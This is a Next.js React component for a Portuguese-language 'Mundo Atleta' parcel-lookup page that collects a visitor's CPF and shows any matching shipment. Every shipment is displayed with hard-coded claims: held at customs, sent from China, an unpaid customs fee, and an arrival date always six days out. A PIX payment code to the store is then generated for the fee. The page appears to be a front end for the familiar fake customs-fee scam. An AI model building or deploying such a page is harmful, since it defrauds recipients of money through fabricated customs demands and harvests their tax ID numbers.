"use client";

import { FormEvent, useState } from "react";
import {
  AlertCircle, Box, CheckCircle2, Copy, LoaderCircle, Search, ShieldCheck, X
} from "lucide-react";

type Shipment = {
  nome: string;
  rastreio: string;
  valorTaxa: number;
  linkPagamento?: string;
};

type ApiResponse = {
  found: boolean;
  shipments?: Shipment[];
  message?: string;
};

type PixData = {
  brCode: string;
  qrCode: string;
  amount: number;
};

function formatCpf(value: string) {
  const digits = value.replace(/\D/g, "").slice(0, 11);
  return digits
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d)/, "$1.$2")
    .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
}

function money(value: number) {
  return new Intl.NumberFormat("pt-BR", { style: "currency", currency: "BRL" }).format(value);
}

function previsaoChegada() {
  const data = new Date();
  data.setDate(data.getDate() + 6);
  return new Intl.DateTimeFormat("pt-BR", {
    timeZone: "America/Sao_Paulo",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
  }).format(data);
}

export default function ConsultaEncomenda() {
  const [cpf, setCpf] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<ApiResponse | null>(null);
  const [error, setError] = useState("");
  const [pix, setPix] = useState<PixData | null>(null);
  const [pixLoading, setPixLoading] = useState(false);
  const [pixError, setPixError] = useState("");
  const [copied, setCopied] = useState(false);

  async function submit(event: FormEvent) {
    event.preventDefault();
    setError("");
    setResult(null);
    const digits = cpf.replace(/\D/g, "");
    if (digits.length !== 11) {
      setError("Digite um CPF com 11 números.");
      return;
    }
    setLoading(true);
    try {
      const response = await fetch("/api/consulta", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ cpf: digits }),
      });
      const data = (await response.json()) as ApiResponse;
      if (!response.ok) throw new Error(data.message || "Não foi possível realizar a consulta.");
      setResult(data);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Não foi possível realizar a consulta.");
    } finally {
      setLoading(false);
    }
  }

  async function abrirPix(amount: number) {
    setPixError("");
    setPixLoading(true);
    setCopied(false);
    try {
      const response = await fetch("/api/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ amount }),
      });
      const data = await response.json();
      if (!response.ok) throw new Error(data.message || "Não foi possível gerar o PIX.");
      setPix(data);
    } catch (err) {
      setPixError(err instanceof Error ? err.message : "Não foi possível gerar o PIX.");
    } finally {
      setPixLoading(false);
    }
  }

  async function copiarPix() {
    if (!pix) return;
    await navigator.clipboard.writeText(pix.brCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <main className="page-shell">
      <header className="topbar">
        <div className="brand-mark">MA</div>
        <div><strong>Mundo Atleta</strong><span>Consulta de Encomendas</span></div>
      </header>

      <section className="content">
        {!result && (
          <div className="card search-card">
            <div className="icon-circle"><Search size={34} /></div>
            <h1>Consulta de Encomendas</h1>
            <p className="lead">Digite seu CPF para consultar a situação da sua encomenda.</p>
            <form onSubmit={submit}>
              <label htmlFor="cpf">CPF</label>
              <input id="cpf" inputMode="numeric" autoComplete="off" placeholder="000.000.000-00" value={cpf} onChange={(e) => setCpf(formatCpf(e.target.value))} />
              {error && <p className="error"><AlertCircle size={17} />{error}</p>}
              <button disabled={loading} type="submit">
                {loading ? <LoaderCircle className="spin" size={19} /> : <Search size={19} />}
                {loading ? "Consultando..." : "Consultar agora"}
              </button>
            </form>
          </div>
        )}

        {result && !result.found && (
          <div className="result-wrap">
            <div className="notice neutral"><AlertCircle size={19} />Nenhuma encomenda com pendência foi encontrada para o CPF informado.</div>
            <button className="secondary" onClick={() => setResult(null)}>Realizar nova consulta</button>
          </div>
        )}

        {result?.found && result.shipments && (
          <div className="result-wrap">
            <div className="notice warning"><AlertCircle size={19} />Encontramos {result.shipments.length} {result.shipments.length === 1 ? "encomenda com pendência" : "encomendas com pendência"}.</div>
            {result.shipments.map((item, index) => (
              <article className="card detail-card" key={`${item.rastreio}-${index}`}>
                <h2><Box size={22} />Detalhes da Encomenda</h2>
                <dl>
                  <div><dt>Destinatário:</dt><dd>{item.nome}</dd></div>
                  <div><dt>Status:</dt><dd className="status">Retida na Alfândega</dd></div>
                  <div><dt>Código de rastreamento:</dt><dd className="tracking">{item.rastreio}</dd></div>
                  <div><dt>Origem:</dt><dd>China</dd></div>
                  <div><dt>Previsão de chegada:</dt><dd>{previsaoChegada()}</dd></div>
                  <div><dt>Motivo da retenção:</dt><dd>Taxa aduaneira não recolhida</dd></div>
                </dl>
                <div className="fee-box">
                  Consta uma taxa relacionada à encomenda no valor de <strong>{money(item.valorTaxa)}</strong>.
                </div>
                <button className="pix-open" onClick={() => abrirPix(item.valorTaxa)} disabled={pixLoading}>
                  {pixLoading ? <LoaderCircle className="spin" size={18} /> : null}
                  {pixLoading ? "Gerando PIX..." : "Prosseguir com a regularização"}
                </button>
                {pixError && <p className="error"><AlertCircle size={17} />{pixError}</p>}
              </article>
            ))}
            <button className="secondary" onClick={() => setResult(null)}>Realizar nova consulta</button>
          </div>
        )}
      </section>

      <footer><ShieldCheck size={16} />Área de acompanhamento da Mundo Atleta. Este site não pertence à Receita Federal do Brasil nem aos Correios.</footer>

      {pix && (
        <div className="modal-backdrop" onMouseDown={() => setPix(null)}>
          <div className="pix-modal" onMouseDown={(e) => e.stopPropagation()} role="dialog" aria-modal="true">
            <button className="modal-close" onClick={() => setPix(null)} aria-label="Fechar"><X size={20} /></button>
            <h3>Pagamento via PIX — Mundo Atleta</h3>
            <p className="pix-subtitle">
              Escaneie o QR Code ou copie o código abaixo. Valor: <strong>{money(pix.amount)}</strong>
            </p>
            <img className="pix-qr" src={pix.qrCode} alt="QR Code PIX" />
            <p className="pix-label">Código PIX copia e cola:</p>
            <div className="copy-row">
              <input readOnly value={pix.brCode} />
              <button onClick={copiarPix}>
                {copied ? <CheckCircle2 size={18} /> : <Copy size={18} />}
                {copied ? "Copiado!" : "Copiar PIX"}
              </button>
            </div>
            <div className="pix-info">
              <ShieldCheck size={18} />
              <span>Pagamento destinado à Mundo Atleta para regularização do pedido junto à loja.</span>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
